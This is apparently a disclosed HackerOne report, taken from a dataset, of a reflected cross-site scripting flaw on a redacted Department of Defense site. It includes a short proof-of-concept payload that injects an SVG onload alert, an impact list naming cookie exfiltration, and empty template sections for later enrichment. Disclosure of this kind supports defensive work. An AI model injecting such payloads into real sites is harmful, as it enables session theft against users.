---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1457444'
original_report_id: '1457444'
title: Reflected XSS at https://██████/██████ via "██████" parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2022-01-21T14:34:04.472Z'
disclosed_at: '2022-02-14T21:20:02.452Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://██████/██████ via "██████" parameter

## Metadata

- HackerOne Report ID: 1457444
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-02-14T21:20:02.452Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

There is Reflected Cross site scripting issue at the following url:

https://██████████/██████

Proof Of Concept

https://████████/█████████████████=%22%3E%3Csvg/onload=alert(1)%3E█████████

█████

Best Regards

@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://████████/████████████████████████=%22%3E%3Csvg/onload=alert(1)%3E██████████

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
